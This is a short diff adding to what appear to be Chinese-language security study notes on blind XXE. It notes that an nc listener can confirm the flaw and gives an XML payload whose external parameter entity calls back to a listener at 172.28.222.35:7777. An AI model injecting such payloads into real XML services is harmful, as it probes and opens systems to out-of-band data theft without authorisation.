@@ -29,3 +29,12 @@ Date: 2026-01-05
  可以看到请求类型
 
 ### 也可以访问本地ip
+
+![](assets/无回显XXE/file-20260105223423993.png)
+
+用nc监听也可以判断
+并且能够获取到外带地址
+```XML
+<!DOCTYPE root [<!ENTITY % sky SYSTEM "http://172.28.222.35:7777/test"> %sky;]>
+```
+
